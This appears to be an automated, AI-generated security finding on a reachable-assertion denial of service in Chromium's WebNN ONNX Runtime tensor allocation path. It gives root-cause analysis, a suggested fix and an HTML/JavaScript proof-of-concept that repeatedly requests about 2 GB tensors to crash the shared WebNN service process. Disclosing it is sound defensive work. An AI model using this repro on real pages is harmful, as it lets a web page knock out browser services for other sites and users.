# Security finding #595: `CHECK_STATUS(ort_api->CreateTensorAsOrtValue(...))` at line 550 wi…

**Summary:** `CHECK_STATUS(ort_api->CreateTensorAsOrtValue(...))` at line 550 wi…

**CWE IDs:** CWE-617: Reachable Assertion
**Severity / Impact:** Denial of service: web content can crash the WebNN service process by requesting a large (but validation-passing) tensor — up to INT32_MAX bytes — causing OOM in ORT's allocator. Because the service process may be shared across origins, one malicious page can evict all concurrent WebNN sessions. No memory corruption, but cross-origin availability impact.
**Affected location:** `targets/chromium/services/webnn/ort/context_impl_ort.cc:550` — `ContextImplOrt::CreateTensorImpl()`
**Validated for repos:** chromiumWebnn
**Trust boundary:** Untrusted web content → Mojo IPC → WebNN service process: attacker-controlled tensor shape/dtype reaches CreateTensorAsOrtValue

## Description / Root cause
`CHECK_STATUS(ort_api->CreateTensorAsOrtValue(...))` at line 550 will crash the service process (not just the requesting renderer) if ORT's allocator returns OOM or any other failure. The TODO comment at line 547 explicitly acknowledges this: "CreateTensorAsOrtValue() could malloc and fail if OOM." There is no graceful error-return path — a CHECK failure kills the entire WebNN service process, potentially evicting all other origins sharing it.

**Validator analysis:** The cited code is confirmed: ContextImplOrt::CreateTensorImpl uses CHECK_STATUS on ort_api->CreateTensorAsOrtValue (context_impl_ort.cc:550-552) and CHECK(tensor.get()) at :553. CHECK_STATUS aborts the process on a non-null OrtStatus, and the two TODOs at :545-548 explicitly note the allocator can malloc/OOM and that a mojom::Error should be emitted instead. The path is reachable from untrusted web content: navigator.ml createTensor → Mojo → WebNNContextImpl → ContextImplOrt::CreateTensorImpl, with attacker-controlled shape/dtype flowing to ort_shape/ort_data_type. This is an accurate CWE-617 Reachable Assertion / DoS: the WebNN service process (potentially shared across origins) is killed rather than the request failing gracefully. There is no memory corruption. Note the crash is NON-DETERMINISTIC: it only fires when the allocator actually fails (OOM), which depends on device memory and any upstream kTensorByteLengthLimit cap; but ANY CreateTensorAsOrtValue failure — not only OOM — trips the CHECK, so the assertion is genuinely reachable. The proposed fix is correct and sufficient in shape: capture the OrtStatus*, ReleaseStatus it, and return base::unexpected(mojom::Error::New(kUnknownError, ...)); likewise replace CHECK(tensor.get()) with a graceful return. A cleaner idiom is a RETURN_IF_ORT_ERROR-style helper mirroring existing CHECK_STATUS so GetTensorSizeInBytes (:556) is covered too. Because the observable effect is a non-deterministic process abort, a formal WPT test is not cleanly assertable and is omitted; an HTML repro that drives the reachable path is supplied. No unit-test field is emitted since the only validated repo (chromiumWebnn) is not one of the OV/OVEP gtest harness targets and its file path is outside the unit-test table.

## Exploit / Proof of Concept
A web page calls `context.createTensor({dataType: 'uint8', shape: [2147483647]})`. This passes all Mojo and ValidateTensor checks (product = INT32_MAX, byte length = INT32_MAX ≤ kTensorByteLengthLimit). `CreateTensorAsOrtValue` tries to allocate ~2 GB; on a memory-constrained device it fails. `CHECK_STATUS` terminates the service process rather than returning a `mojom::Error`.

## Reproduction (html)
```
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>WebNN CreateTensor OOM CHECK crash (crbug 445971854)</title></head>
<body>
<h1>WebNN ORT CreateTensorImpl reachable-assertion DoS</h1>
<pre id="log"></pre>
<script>
// Repro for context_impl_ort.cc:550 CHECK_STATUS(CreateTensorAsOrtValue(...)).
// Run Chrome on Windows (ORT WebNN backend) with:
//   --enable-features=WebMachineLearningNeuralNetwork
// Drives navigator.ml -> createTensor with a validation-passing but huge
// tensor. When ORT's allocator returns OOM the WebNN *service* process is
// killed by CHECK_STATUS instead of the promise rejecting -> cross-origin DoS.
const log = (m) => { document.getElementById('log').textContent += m + "\n"; };
(async () => {
  try {
    if (!navigator.ml) { log('navigator.ml unavailable'); return; }
    const context = await navigator.ml.createContext({deviceType: 'cpu'});
    // uint8 [2147483647] => product = INT32_MAX bytes: passes ValidateTensor
    // (<= kTensorByteLengthLimit) yet forces a ~2GB allocator request.
    const descriptors = [
      {dataType: 'uint8', shape: [2147483647]},
      {dataType: 'float32', shape: [536870911]},
    ];
    for (const d of descriptors) {
      try {
        log('requesting tensor ' + JSON.stringify(d));
        // Repeatedly allocate to exhaust memory on constrained devices.
        const held = [];
        for (let i = 0; i < 64; i++) {
          held.push(await context.createTensor(d));
          log('  alloc #' + i + ' ok');
        }
      } catch (e) {
        // A GRACEFUL implementation rejects here (OperationError/UnknownError).
        log('  rejected gracefully: ' + e.name + ' ' + e.message);
      }
    }
    log('If the WebNN service crashed, subsequent createTensor calls fail with a connection error rather than a DOMException.');
  } catch (e) {
    log('fatal: ' + e);
  }
})();
</script>
</body>
</html>
```

## Test
_(not provided)_


## Suggested fix
Replace `CHECK_STATUS(ort_api->CreateTensorAsOrtValue(...))` with a non-crashing error path: capture the `OrtStatus*` return value, and if non-null, free it via `ort_api->ReleaseStatus` and return `base::unexpected(mojom::Error::New(mojom::Error::Code::kUnknownError, "ORT tensor allocation failed"))`. Similarly convert the `CHECK(tensor.get())` on line 553 to a graceful return.


---
_Filed by an automated security-scan harness; AI-generated — review before acting._ Finding #595.
